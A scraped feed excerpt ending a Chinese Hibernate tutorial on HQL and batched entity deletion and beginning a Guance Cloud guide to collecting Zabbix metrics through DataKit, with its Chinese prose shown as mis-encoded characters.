    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡åˆ é™¤</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchDeleteExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        deleteProductsByPrice(<span class="hljs-number">1000.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProductsByPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"delete from Product where price &gt; :price"</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">deletedEntities</span> <span class="hljs-operator">=</span> session.createQuery(hql)
                                         .setParameter(<span class="hljs-string">"price"</span>, price)
                                         .executeUpdate();
            transaction.commit();
            System.out.println(<span class="hljs-string">"Number of products deleted: "</span> + deletedEntities);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. ä½¿ç”¨æ‰¹é‡æ“ä½œè®¾ç½®è¿›è¡Œä¼˜åŒ–</h3>
<p>Hibernateå…è®¸é€šè¿‡æ‰¹é‡æ“ä½œè®¾ç½®æ¥ä¼˜åŒ–æ‰¹é‡åˆ é™¤çš„æ€§èƒ½ã€‚åœ¨<code>hibernate.cfg.xml</code>ä¸­è®¾ç½®æ‰¹é‡æ“ä½œå±æ€§ï¼š</p>
<h4 data-id="heading-5">é…ç½®æ‰¹é‡æ“ä½œ</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- other configurations --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.jdbc.batch_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_inserts"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.order_updates"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">æ‰¹é‡åˆ é™¤ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateBatchDeleteExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        batchDeleteProductsByPrice(<span class="hljs-number">1000.0</span>);
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDeleteProductsByPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            List&lt;Product&gt; products = session.createQuery(<span class="hljs-string">"from Product where price &gt; :price"</span>, Product.class)
                                            .setParameter(<span class="hljs-string">"price"</span>, price)
                                            .list();
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Product product : products) {
                session.delete(product);

                <span class="hljs-comment">// æ¯æ‰¹æ¬¡20ä¸ªè¿›è¡Œä¸€æ¬¡æ‰¹å¤„ç†</span>
                <span class="hljs-keyword">if</span> (++count % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>) {
                    session.flush();
                    session.clear();
                }
            }
            transaction.commit();
            System.out.println(<span class="hljs-string">"Products deleted successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-7">æ€»ç»“</h3>
<ol>
<li><strong>ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡åˆ é™¤</strong>ï¼šé€šè¿‡HQLè¯­å¥å¯ä»¥ç›´æ¥æ‰§è¡Œæ‰¹é‡åˆ é™¤æ“ä½œï¼Œé¿å…é€æ¡åˆ é™¤å®ä½“ã€‚</li>
<li><strong>é…ç½®Hibernateæ‰¹é‡æ“ä½œè®¾ç½®</strong>ï¼šé€šè¿‡åœ¨<code>hibernate.cfg.xml</code>ä¸­è®¾ç½®<code>hibernate.jdbc.batch_size</code>ç­‰å±æ€§ï¼Œå¯ä»¥ä¼˜åŒ–æ‰¹é‡åˆ é™¤çš„æ€§èƒ½ã€‚</li>
<li><strong>æ‰¹é‡åˆ é™¤ç¤ºä¾‹</strong>ï¼šé€šè¿‡ä½¿ç”¨æ‰¹é‡æ“ä½œè®¾ç½®å’Œå®šæœŸåˆ·æ–°æ¸…ç†ä¼šè¯ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†å¤§æ‰¹é‡çš„æ•°æ®åˆ é™¤ã€‚</li>
</ol>
<p>é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œå¯ä»¥æ˜¾è‘—æé«˜Hibernateåº”ç”¨ç¨‹åºçš„æ‰¹é‡åˆ é™¤æ€§èƒ½ã€‚å¸Œæœ›è¿™äº›è¯¦ç»†çš„è§£é‡Šå’Œä»£ç ç¤ºä¾‹èƒ½å¸®åŠ©æ‚¨æ›´å¥½åœ°ç†è§£å’Œåº”ç”¨Hibernateçš„æ‰¹é‡åˆ é™¤æŠ€æœ¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è§‚æµ‹äº‘æ¥å…¥ Zabbix æ•°æ®æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7597635202324561972</link>    <guid>https://juejin.cn/post/7597635202324561972</guid>    <pubDate>2026-01-21T10:16:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324561972" data-draft-id="7597483279270559759" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è§‚æµ‹äº‘æ¥å…¥ Zabbix æ•°æ®æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="Zabbix"/> <meta itemprop="datePublished" content="2026-01-21T10:16:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è§‚æµ‹äº‘æ¥å…¥ Zabbix æ•°æ®æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:16:25.000Z" title="Wed Jan 21 2026 10:16:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Zabbix ä»‹ç»</h2>
<p>Zabbix æ˜¯ä¸€ä¸ªå¼€æºçš„ä¼ä¸šçº§ç›‘æ§è§£å†³æ–¹æ¡ˆï¼Œå®ƒå¯ä»¥ç›‘æ§å„ç§ç½‘ç»œå‚æ•°ï¼ŒæœåŠ¡å™¨å¥åº·çŠ¶æ€ï¼Œåº”ç”¨ç¨‹åºæ€§èƒ½ç­‰ï¼Œå¹¶æä¾›çµæ´»çš„å‘Šè­¦æœºåˆ¶å’Œä¸°å¯Œçš„æŠ¥è¡¨åŠŸèƒ½ã€‚</p>
<p><strong>1ã€Zabbix Server</strong></p>
<ul>
<li>æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£æ¥æ”¶å’Œå¤„ç†æ‰€æœ‰ç›‘æ§æ•°æ®ï¼Œç”ŸæˆæŠ¥è­¦å’ŒæŠ¥è¡¨ã€‚</li>
<li>éœ€è¦ä¸€ä¸ªæ•°æ®åº“æ¥å­˜å‚¨æ‰€æœ‰é…ç½®å’Œç›‘æ§æ•°æ®ã€‚</li>
</ul>
<p><strong>2ã€Zabbix Agent</strong></p>
<ul>
<li>éƒ¨ç½²åœ¨è¢«ç›‘æ§çš„è®¾å¤‡ä¸Šï¼Œè´Ÿè´£æ”¶é›†æœ¬åœ°èµ„æºå’Œåº”ç”¨æ•°æ®ï¼Œå¹¶å‘é€ç»™ Zabbix Serverã€‚</li>
<li>æ”¯æŒå¤šç§æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬ Linuxã€Windows å’Œ Unixã€‚</li>
<li>å…¶ä¸­ Agent åˆ†ä¸º Zabbix Agent å’Œ Zabbix Agent 2ï¼Œåè€…æ˜¯å¢å¼ºç‰ˆ Agentï¼Œæ”¯æŒæ’ä»¶ï¼Œé€‚åˆå¤§è§„æ¨¡ç›‘æ§ã€‚</li>
</ul>
<p><strong>3ã€Zabbix Proxy</strong></p>
<ul>
<li>ç”¨äºåˆ†æ‹… Zabbix Server çš„è´Ÿè½½ï¼Œå°¤å…¶é€‚ç”¨äºå¤§è§„æ¨¡åˆ†å¸ƒå¼ç›‘æ§ã€‚</li>
<li>å¯ä»¥åœ¨è¿œç¨‹ç½‘ç»œä¸­æ”¶é›†æ•°æ®å¹¶è½¬å‘ç»™ Zabbix Serverã€‚</li>
</ul>
<p><strong>4ã€Zabbix Web Interface</strong></p>
<ul>
<li>åŸºäº PHP çš„ Web ç•Œé¢ï¼Œç”¨äºé…ç½®ã€ç®¡ç†å’ŒæŸ¥çœ‹ç›‘æ§æ•°æ®ã€‚</li>
<li>æä¾›ç”¨æˆ·ç®¡ç†ã€æƒé™æ§åˆ¶ã€ä»ªè¡¨ç›˜å’ŒæŠ¥è¡¨ç­‰åŠŸèƒ½ã€‚</li>
</ul>
<p><strong>5ã€æ•°æ®åº“</strong></p>
<ul>
<li>å­˜å‚¨æ‰€æœ‰çš„é…ç½®ã€ç›‘æ§æ•°æ®ã€å†å²è®°å½•ç­‰ã€‚</li>
<li>æ”¯æŒå¤šç§æ•°æ®åº“ï¼Œå¦‚ MySQLã€PostgreSQLã€Oracleã€SQLiteã€‚</li>
</ul>
<h2 data-id="heading-1">è§‚æµ‹äº‘</h2>
<p>è§‚æµ‹äº‘æ˜¯ä¸€æ¬¾ä¸“ä¸º IT å·¥ç¨‹å¸ˆæ‰“é€ çš„å…¨é“¾è·¯å¯è§‚æµ‹äº§å“ï¼Œå®ƒé›†æˆäº†åŸºç¡€è®¾æ–½ç›‘æ§ã€åº”ç”¨ç¨‹åºæ€§èƒ½ç›‘æ§å’Œæ—¥å¿—ç®¡ç†ï¼Œä¸ºæ•´ä¸ªæŠ€æœ¯æ ˆæä¾›å®æ—¶å¯è§‚å¯Ÿæ€§ã€‚è¿™æ¬¾äº§å“èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå…¨é¢äº†è§£ç«¯åˆ°ç«¯çš„ç”¨æˆ·ä½“éªŒè¿½è¸ªï¼Œäº†è§£åº”ç”¨å†…å‡½æ•°çš„æ¯ä¸€æ¬¡è°ƒç”¨ï¼Œä»¥åŠå…¨é¢ç›‘æ§äº‘æ—¶ä»£çš„åŸºç¡€è®¾æ–½ã€‚æ­¤å¤–ï¼Œè§‚æµ‹äº‘è¿˜å…·å¤‡å¿«é€Ÿå‘ç°ç³»ç»Ÿå®‰å…¨é£é™©çš„èƒ½åŠ›ï¼Œä¸ºæ•°å­—åŒ–æ—¶ä»£æä¾›å®‰å…¨ä¿éšœã€‚</p>
<h3 data-id="heading-2">éƒ¨ç½² DataKit</h3>
<p>DataKit æ˜¯ä¸€ä¸ªå¼€æºçš„ã€è·¨å¹³å°çš„æ•°æ®æ”¶é›†å’Œç›‘æ§å·¥å…·ï¼Œç”±è§‚æµ‹äº‘å¼€å‘å¹¶ç»´æŠ¤ã€‚å®ƒæ—¨åœ¨å¸®åŠ©ç”¨æˆ·æ”¶é›†ã€å¤„ç†å’Œåˆ†æå„ç§æ•°æ®æºï¼Œå¦‚æ—¥å¿—ã€æŒ‡æ ‡å’Œäº‹ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œæœ‰æ•ˆçš„ç›‘æ§å’Œæ•…éšœæ’æŸ¥ã€‚DataKit æ”¯æŒå¤šç§æ•°æ®è¾“å…¥å’Œè¾“å‡ºæ ¼å¼ï¼Œå¯ä»¥è½»æ¾é›†æˆåˆ°ç°æœ‰çš„ç›‘æ§ç³»ç»Ÿä¸­ã€‚ï¼ˆæ³¨æ„ï¼Œè¯·å®‰è£…å®Œæ•´ç‰ˆ DataKitï¼ŒLite ç‰ˆæœ¬ DataKit æ²¡æœ‰ Zabbix ç›¸å…³é‡‡é›†å™¨ã€‚ï¼‰</p>
<p>ç™»å½•<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.guance.com%2F" target="_blank" title="https://www.guance.com/" ref="nofollow noopener noreferrer">è§‚æµ‹äº‘æ§åˆ¶å°</a>ï¼Œåœ¨ã€Œé›†æˆã€ - ã€ŒDataKitã€é€‰æ‹©å¯¹åº”å®‰è£…æ–¹å¼ã€‚è¿™é‡Œä½¿ç”¨ä¸»æœºæ–¹å¼å®‰è£…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7599dd7005c04987a936f5bcef7e970f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=FrD1nY%2BZQjMy9kSmGPcQj9tEREY%3D" alt="" loading="lazy"/></p>
<p>å¤åˆ¶ä¸€é”®å®‰è£…å‘½ä»¤ï¼Œç™»é™†åˆ°ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œè¯¥å‘½ä»¤å³å¯å®ç°ä¸€é”®å®‰è£…ã€‚</p>
<p>æ‰§è¡ŒÂ <code>datakit monitor</code>Â å‘½ä»¤æŸ¥çœ‹ DataKit è¿è¡ŒçŠ¶æ€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edd219c16b4d48ea813b3c4384d8aded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=t6MIZEuv4lfk9LyA8DeB1R88TCs%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">æŒ‡æ ‡æ•°æ®é‡‡é›†</h2>
<h3 data-id="heading-4">Zabbix API æ–¹å¼ï¼ˆzabbix &gt;= 5.0)</h3>
<h4 data-id="heading-5">DataKit æ–¹å¼</h4>
<p>1ã€é…ç½® pythond é…ç½®æ–‡ä»¶</p>
<p>è¿›å…¥ DataKit çš„é…ç½®æ–‡ä»¶ç›®å½•Â <code>conf.d</code>ï¼Œè¿›å…¥ pythond ç›®å½•ï¼Œå¤åˆ¶Â <code>pythond.conf.sample</code>Â ä¸ºÂ <code>pythond.conf</code>, ä¿®æ”¹å¦‚ä¸‹é…ç½®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[[inputs.pythond]]</span>
  <span class="hljs-comment"># Python input name</span>
  <span class="hljs-attr">name</span> = <span class="hljs-string">'zabbix_collect'</span>  <span class="hljs-comment"># required</span>

  <span class="hljs-comment"># System environments to run Python</span>
  <span class="hljs-comment">#envs = ['LD_LIBRARY_PATH=/path/to/lib:$LD_LIBRARY_PATH',]</span>
  <span class="hljs-attr">envs</span> = [<span class="hljs-string">'ZABBIX_HOST=http://127.0.0.1/zabbix'</span>, <span class="hljs-string">'ZABBIX_USER=Admin'</span>, <span class="hljs-string">'ZABBIX_PASSWD=zabbix'</span>, <span class="hljs-string">'ZABBIX_VERSION=7.0'</span>, <span class="hljs-string">'COLLECT_TYPE=api'</span>]

  <span class="hljs-comment"># Python path(recomment abstract Python path)</span>
  <span class="hljs-attr">cmd</span> = <span class="hljs-string">"python3"</span> <span class="hljs-comment"># required. python3 is recommended.</span>

  <span class="hljs-comment"># Python scripts relative path</span>
  <span class="hljs-attr">dirs</span> = [<span class="hljs-string">"zabbix"</span>]
</code></pre>
<p>å…¶ä¸­Â <code>ZABBIX_HOST</code>ï¼Œ<code>ZABBIX_USER</code>ï¼Œ<code>ZABBIX_PASSWD</code>ï¼Œ<code>ZABBIX_VERSION</code>Â å¡«å†™å®é™… Zabbix çš„åœ°å€ç”¨æˆ·åå¯†ç å’Œç‰ˆæœ¬ã€‚</p>
<p>ä¿å­˜å¹¶é€€å‡ºã€‚</p>
<p>2ã€å¤åˆ¶è„šæœ¬</p>
<p>è¿›å…¥ DataKit ç›®å½•ï¼Œè¿›å…¥Â <code>python.d</code>Â ç›®å½•ï¼Œåˆ›å»º zabbix ç›®å½•ï¼Œç‚¹å‡»ä¸‹æ–¹é“¾æ¥ä¸‹è½½è„šæœ¬åˆ° zabbix ç›®å½•ä¸‹ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fstatic.guance.com%2Fintegrations%2Fzabbix%2Fzabbix-collector.py" target="_blank" title="https://static.guance.com/integrations/zabbix/zabbix-collector.py" ref="nofollow noopener noreferrer">static.guance.com/integrationâ€¦</a></p>
<p>3ã€é‡å¯ DataKit</p>
<pre><code class="hljs">datakit service -R
</code></pre>
<p>4ã€æ£€æŸ¥é‡‡é›†ä»»åŠ¡ï¼Œå‡ºç° zabbix_collect ä»»åŠ¡åˆ™è¯´æ˜é‡‡é›†ä»»åŠ¡å¼€å¯æˆåŠŸ</p>
<pre><code class="hljs">datakit monitor
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2c18a5830f144bfa5fb6ac1fbc186de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=ZEOkdXJAHBEsEK%2B9nMwHiBIGCZQ%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6">Func æ–¹å¼</h4>
<p>1ã€å®‰è£…é‡‡é›†è„šæœ¬</p>
<p>ç™»å½• Funcï¼Œç‚¹å‡»ã€Œè„šæœ¬å¸‚åœºã€ï¼Œé€‰æ‹©é¢„è£…è„šæœ¬å¸‚åœºï¼Œç‚¹å‡»ç®¡ç†æŒ‰é’®ï¼Œè¿›å…¥é¢„è£…è„šæœ¬å¸‚åœºçš„è„šæœ¬åˆ—è¡¨é¡µã€‚åœ¨è¿‡æ»¤æœç´¢æ¡†ä¸­è¾“å…¥ ï¼Œè¿‡æ»¤å‡º zabbix é‡‡é›†è„šæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9827b85247344a82b6a9e4a036c51167~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595385&amp;x-signature=8pf8WY4hoj4APmKdb6VlRPTX000%3D" alt="" loading="lazy"/></p>
